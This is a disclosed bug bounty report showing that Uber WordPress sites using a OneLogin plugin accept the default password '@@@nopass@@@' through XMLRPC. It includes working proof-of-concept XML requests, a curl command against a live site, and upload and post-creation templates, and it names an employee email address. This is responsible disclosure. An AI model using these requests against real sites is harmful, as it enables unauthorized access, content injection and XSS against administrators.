# OneLogin authentication bypass on WordPress sites via XMLRPC

## Report Details
- **Report ID**: 138869
- **URL**: https://hackerone.com/reports/138869
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-15T00:03:20.825Z
- **Disclosed**: 2016-07-15T22:04:09.271Z

## Reporter
- **Username**: jouko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password `@@@nopass@@@`. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.

The OneLogin plugin does prevent logins through the normal *wp-login.php* page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: `wp-login.php?normal=1`. The settings did not allow this on the Uber sites I tried.

An attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).

This probably affects most of your WordPress sites. I've confirmed this on *love.uber.com* and *newsroom.uber.com* by creating pages and posts (not public) and uploading files.

The XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:
~~~~
wp.deleteFile
wp.editComment
wp.getOptions
wp.getUsers
wp.newPage
wp.newPost
wp.setOptions
wp.uploadFile
~~~~
#Reproducing#
Create an XML file named `options.xml` containing:
~~~~ xml
<?xml version="1.0"?>
<methodCall>
<methodName>wp.getOptions</methodName>
<params>
	<param><value>zzz</value></param>
        <param><value>cbarry@uber.com</value></param>
        <param><value>@@@nopass@@@</value></param>
</params>
</methodCall>
~~~~
Run the UNIX command:
~~~~ sh
curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat options.xml`" -H 'Content-type: application/xml'
~~~~
You should get the response:
~~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <struct>
  <member><name>software_name</name><value><struct>
  <member><name>desc</name><value><string>Software Name</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>WordPress</string></value></member>
</struct></value></member>
  <member><name>software_version</name><value><struct>
  <member><name>desc</name><value><string>Software Version</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>4.4.3</string></value></member>
</struct></value></member>
  <member><name>blog_url</name><value><struct>
  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
...etc.
~~~~
#Exploit scenarios#
Options in the above output that aren't marked *readonly* can also be changed. I didn't check if this is exploitable.

For usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.

A new post can be created with the following request. Without supplying a `post_status` parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.
~~~~ xml
<?xml version="1.0"?>
<methodCall>
<methodName>wp.newPost</methodName>
<params>
        <param><value>what is this parameter</value></param>
        <param><value>(INSERT USERNAME)</value></param>
        <param><value>@@@nopass@@@</value></param>
        <param><struct>
                <member><name>post_title</name><value>bugbounty test post</value></member>
                <member><name>post_content</name><value>any HTML content here</value></member>
                <member><name>post_excerpt</name><value>excerpt</value></member>
        </struct></param>
</params>
</methodCall>
~~~~
I've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:
* https://love.uber.com/australia/?page_id=6085
* https://newsroom.uber.com/us-new-york/?p=2567

A file can be uploaded with a request like this:
~~~~ xml
<?xml version="1.0"?>
<methodCall>
<methodName>metaWeblog.newMediaObject</methodName>
<params>
        <param><value>what is this parameter</value></param>
        <param><value>(INSERT USERNAME)</value></param>
        <param><value>@@@nopass@@@</value></param>
        <param><struct>
                <member><name>name</name><value>file_name.html</value></member>
                <member><name>type</name><value>text/plain</value></member>
                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
        </struct></param>
</params>
</methodCall>
~~~~
The ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.

As a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key
I tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. 

## Attachments
No attachments
